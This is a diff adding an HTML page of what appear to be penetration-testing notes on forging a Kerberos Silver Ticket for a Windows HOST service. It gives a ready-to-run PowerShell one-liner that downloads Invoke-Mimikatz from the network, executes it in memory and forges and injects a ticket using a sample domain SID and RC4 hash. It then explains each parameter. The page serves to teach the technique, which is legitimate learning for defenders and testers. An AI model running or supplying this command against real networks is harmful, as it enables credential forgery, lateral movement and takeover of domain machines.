@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>HOST service</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>HOST service</h1><br /><br /><strong>HOST Service</strong><br />With the <span
+      style="color:#ff00e0;">SilverTicket</span> for the Host Service we have the ability to modify and create scheduled
+    tasks<br />1. The one line Powershell for create a <span style="color:#ff00e0;">ServiceTicket</span> for <span
+      style="color:#f6ff00;">HOST Service</span>:<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/target:TESTDC.DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/rc4:be680d0eb8d8c44bfefaaecb69515b9d&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/service:host&nbsp;/ptt&quot;&#39;;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::list&quot;&#39;
+      </div>
+    </div><br /> <a href=""><img src="images/1150-1.png" alt="images/1150-1.png" /></a><br /> <a href=""><img
+        src="images/1150-2.png" alt="images/1150-2.png" /></a><br /> <strong>Parameters that we should
+      edit</strong><br /> <code>/domain:</code> → Domain FQDN<br /> <code>/target:</code> → Target server FQDN. This is
+    formed by &lt;hostname&gt;.&lt;domain&gt;. For example testdc.daniele.local<br /> <a href=""><img
+        src="images/1150-3.png" alt="images/1150-3.png" /></a><br /> <em><code>/sid:</code></em> → SID of the
+    domain<br /> <em><code>/service:</code></em> → SPN of the Service for which we want create the Silver ticket. For
+    example with “cifs” we can access to the Windows File Share of the Target machine<br /> <code>/rc4:</code><em>
+    </em>→ NT Hash(RC4) of the Computer account. Use /aes128 and /aes256 for using AES keys <em><br />
+    </em><em><code>/startoffset:0</code></em> → Optional. When the Ticket is available in minutes(default is 0 that
+    means &quot;right now&quot;) . <br /> ▪ Use negative numbers for a ticket available from past <br /> ▪ Use large
+    number for the future<em><br /> </em><code>/endin:</code> → Optional. Ticket lifetime in minutes(default is 10
+    years). The default setting in Mimikatz is 10 hours==600 minutes<br /> <code>/renewmax:</code> → Optional. Ticket
+    lifetime for renewal(default is 10 yeas). The default setting in Mimikatz is 7 days==10080 minutes<br />
+    <code>/ptt</code> or <code>/ticket</code> → It is not possible use both at the same time<br /> ▪ /ptt inject the
+    ticket in current Powershell process, no need to save the ticket on disk<br /> ▪ /ticket save the ticket to a file
+    for later use
+  </div>
+</body>
+
+</html>
